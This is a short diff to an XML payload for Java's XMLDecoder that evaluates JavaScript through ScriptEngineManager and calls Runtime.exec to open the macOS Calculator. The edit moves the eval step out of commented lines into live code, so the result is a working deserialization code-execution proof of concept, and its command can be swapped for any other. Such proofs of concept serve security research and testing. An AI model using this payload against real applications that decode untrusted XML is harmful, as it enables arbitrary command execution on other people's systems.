@@ -2,14 +2,11 @@
     <new class="javax.script.ScriptEngineManager">
         <void method="getEngineByName" id="js">
             <string>js</string>
+        </void>
+        <object idref="js">
             <void method="eval">
                 <string><![CDATA[java.lang.Runtime.getRuntime().exec('open /System/Applications/Calculator.app');]]></string>
             </void>
-        </void>
-<!--        <object idref="js">-->
-<!--            <void method="eval">-->
-<!--                <string><![CDATA[java.lang.Runtime.getRuntime().exec('open /System/Applications/Calculator.app');]]></string>-->
-<!--            </void>-->
-<!--        </object>-->
+        </object>
     </new>
 </java>
